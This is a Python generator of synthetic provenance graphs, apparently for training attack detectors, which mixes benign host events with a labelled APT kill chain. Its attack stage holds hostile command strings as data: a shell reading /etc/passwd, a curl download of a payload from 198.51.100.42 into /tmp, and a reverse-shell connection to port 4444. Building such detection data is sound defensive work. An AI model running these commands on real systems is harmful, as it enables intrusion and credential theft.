import random
import time
from typing import Dict, List, Tuple
from koton.data.schema import ProcessNode, FileNode, SocketNode, ProvenanceEvent


class SyntheticDarpaTcGenerator:
    """
    Generates realistic DARPA TC (THEIA / TRACE) style provenance graphs
    with normal host activities and APT-style attack kill-chains.
    Guarantees strict chronological event ordering (no temporal leakage).
    """

    def __init__(self, start_time: float = 1700000000.0, seed: int = 42):
        self.current_time = start_time
        random.seed(seed)
        self.processes: Dict[str, ProcessNode] = {}
        self.files: Dict[str, FileNode] = {}
        self.sockets: Dict[str, SocketNode] = {}
        self.events: List[ProvenanceEvent] = []
        self._init_system_baseline()

    def _tick(self, min_sec: float = 0.5, max_sec: float = 2.5) -> float:
        self.current_time += random.uniform(min_sec, max_sec)
        return self.current_time

    def _init_system_baseline(self):
        """Initialize standard system background processes and baseline files."""
        # systemd (PID 1)
        systemd = ProcessNode(
            key="proc:1:systemd",
            pid=1,
            name="systemd",
            cmdline="/sbin/init",
            path="/sbin/init",
            uid=0,
            timestamp=self.current_time,
            label=0
        )
        self.processes[systemd.key] = systemd

        # auditd (PID 450)
        auditd = ProcessNode(
            key="proc:450:auditd",
            pid=450,
            name="auditd",
            cmdline="/sbin/auditd",
            path="/sbin/auditd",
            uid=0,
            timestamp=self.current_time,
            label=0
        )
        self.processes[auditd.key] = auditd

        # Web server (PID 1024)
        web_server = ProcessNode(
            key="proc:1024:python_web",
            pid=1024,
            name="python3",
            cmdline="python3 server.py --port 5000",
            path="/usr/bin/python3",
            uid=1000,
            timestamp=self.current_time,
            label=0
        )
        self.processes[web_server.key] = web_server

        # Baseline files
        base_files = [
            "/etc/passwd", "/var/log/audit/audit.log", "/var/log/syslog",
            "/app/server.py", "/app/static/index.html", "/app/uploads"
        ]
        for fpath in base_files:
            fn = FileNode(
                key=f"file:{fpath}",
                path=fpath,
                timestamp=self.current_time,
                label=0
            )
            self.files[fn.key] = fn

    def generate_benign_event(self):
        """Simulate normal system and web service activities."""
        t = self._tick(0.2, 1.5)
        action_type = random.choice(["web_request", "syslog_write", "cron_job", "user_cli"])

        if action_type == "web_request":
            # Web server reads static file or writes upload
            target_f = random.choice(["/app/static/index.html", "/app/server.py"])
            f_key = f"file:{target_f}"
            self.events.append(ProvenanceEvent(
                timestamp=t,
                src_type="process",
                src_key="proc:1024:python_web",
                relation="read",
                dst_type="file",
                dst_key=f_key,
                is_attack=False
            ))
            # Normal client socket
            client_ip = f"192.168.1.{random.randint(10, 80)}"
            client_port = random.randint(30000, 60000)
            sock_key = f"sock:{client_ip}:{client_port}"
            if sock_key not in self.sockets:
                self.sockets[sock_key] = SocketNode(
                    key=sock_key, ip=client_ip, port=client_port, timestamp=t, label=0
                )
            self.events.append(ProvenanceEvent(
                timestamp=t,
                src_type="process",
                src_key="proc:1024:python_web",
                relation="connect",
                dst_type="socket",
                dst_key=sock_key,
                is_attack=False
            ))

        elif action_type == "syslog_write":
            self.events.append(ProvenanceEvent(
                timestamp=t,
                src_type="process",
                src_key="proc:450:auditd",
                relation="write",
                dst_type="file",
                dst_key="file:/var/log/audit/audit.log",
                is_attack=False
            ))

        elif action_type == "user_cli":
            pid = random.randint(2000, 5000)
            cmd = random.choice(["ls -la", "git status", "df -h", "uptime"])
            cli_proc = ProcessNode(
                key=f"proc:{pid}:bash",
                pid=pid,
                name="bash",
                cmdline=cmd,
                path="/bin/bash",
                uid=1000,
                timestamp=t,
                label=0
            )
            self.processes[cli_proc.key] = cli_proc
            self.events.append(ProvenanceEvent(
                timestamp=t,
                src_type="process",
                src_key="proc:1:systemd",
                relation="fork",
                dst_type="process",
                dst_key=cli_proc.key,
                is_attack=False
            ))

    def inject_apt_attack_scenario(self, scenario_name: str = "webshell_dropper_rce"):
        """
        Inject an APT attack chain with ground-truth malicious labels (1).
        Traces a multi-stage kill chain:
        RCE -> Recon -> Dropper -> Exec /tmp payload -> Reverse Shell C2.
        """
        t = self._tick(1.0, 3.0)

        # Step 1: Web server spawns malicious subshell (RCE / WebShell)
        shell_pid = random.randint(7000, 7999)
        shell_proc = ProcessNode(
            key=f"proc:{shell_pid}:sh",
            pid=shell_pid,
            name="sh",
            cmdline="/bin/sh -c 'whoami; cat /etc/passwd'",
            path="/bin/sh",
            uid=1000,
            timestamp=t,
            label=1,
            is_anomaly=True
        )
        self.processes[shell_proc.key] = shell_proc
        self.events.append(ProvenanceEvent(
            timestamp=t,
            src_type="process",
            src_key="proc:1024:python_web",
            relation="fork",
            dst_type="process",
            dst_key=shell_proc.key,
            is_attack=True,
            metadata={"stage": "Initial Compromise / WebShell"}
        ))

        # Step 2: Recon / Sensitive Credential Access (/etc/passwd)
        t = self._tick(0.5, 1.0)
        self.events.append(ProvenanceEvent(
            timestamp=t,
            src_type="process",
            src_key=shell_proc.key,
            relation="read",
            dst_type="file",
            dst_key="file:/etc/passwd",
            is_attack=True,
            metadata={"stage": "Credential Dumping / Recon"}
        ))

        # Step 3: Dropper payload downloaded via curl / wget to /tmp
        t = self._tick(0.5, 1.2)
        curl_pid = random.randint(8000, 8500)
        curl_proc = ProcessNode(
            key=f"proc:{curl_pid}:curl",
            pid=curl_pid,
            name="curl",
            cmdline="curl -s http://198.51.100.42:8080/stage2.elf -o /tmp/stage2.elf",
            path="/usr/bin/curl",
            uid=1000,
            timestamp=t,
            label=1,
            is_anomaly=True
        )
        self.processes[curl_proc.key] = curl_proc
        self.events.append(ProvenanceEvent(
            timestamp=t,
            src_type="process",
            src_key=shell_proc.key,
            relation="fork",
            dst_type="process",
            dst_key=curl_proc.key,
            is_attack=True,
            metadata={"stage": "Dropper Fork"}
        ))

        # Dropped file node in /tmp
        t = self._tick(0.2, 0.5)
        stage2_file = FileNode(
            key="file:/tmp/stage2.elf",
            path="/tmp/stage2.elf",
            extension=".elf",
            timestamp=t,
            label=1,
            is_anomaly=True
        )
        self.files[stage2_file.key] = stage2_file
        self.events.append(ProvenanceEvent(
            timestamp=t,
            src_type="process",
            src_key=curl_proc.key,
            relation="write",
            dst_type="file",
            dst_key=stage2_file.key,
            is_attack=True,
            metadata={"stage": "Payload Drop"}
        ))

        # Step 4: Execute downloaded payload /tmp/stage2.elf
        t = self._tick(0.5, 1.0)
        payload_pid = random.randint(8600, 8999)
        payload_proc = ProcessNode(
            key=f"proc:{payload_pid}:stage2.elf",
            pid=payload_pid,
            name="stage2.elf",
            cmdline="/tmp/stage2.elf",
            path="/tmp/stage2.elf",
            uid=0,  # Simulated privilege escalation
            timestamp=t,
            label=1,
            is_anomaly=True
        )
        self.processes[payload_proc.key] = payload_proc
        self.events.append(ProvenanceEvent(
            timestamp=t,
            src_type="process",
            src_key=shell_proc.key,
            relation="exec",
            dst_type="process",
            dst_key=payload_proc.key,
            is_attack=True,
            metadata={"stage": "Privilege Escalation & Payload Execution"}
        ))

        # Step 5: C2 Beaconing / Reverse Shell Connection to external IP:4444
        t = self._tick(0.3, 0.8)
        c2_sock = SocketNode(
            key="sock:198.51.100.42:4444",
            ip="198.51.100.42",
            port=4444,
            protocol="tcp",
            timestamp=t,
            label=1,
            is_anomaly=True
        )
        self.sockets[c2_sock.key] = c2_sock
        self.events.append(ProvenanceEvent(
            timestamp=t,
            src_type="process",
            src_key=payload_proc.key,
            relation="connect",
            dst_type="socket",
            dst_key=c2_sock.key,
            is_attack=True,
            metadata={"stage": "C2 Reverse Shell Established"}
        ))

    def generate_timeline(
        self,
        total_events: int = 1200,
        attack_intervals: List[Tuple[float, float]] = None
    ) -> Tuple[Dict[str, ProcessNode], Dict[str, FileNode], Dict[str, SocketNode], List[ProvenanceEvent]]:
        """
        Generate a complete chronological stream of provenance events.
        Injects realistic attacks at defined progress milestones.
        """
        attack_milestones = [int(total_events * 0.4), int(total_events * 0.75)]
        for i in range(total_events):
            if i in attack_milestones:
                self.inject_apt_attack_scenario()
            else:
                self.generate_benign_event()

        # Strict chronological sort to prevent temporal leakage
        self.events.sort(key=lambda ev: ev.timestamp)
        return self.processes, self.files, self.sockets, self.events
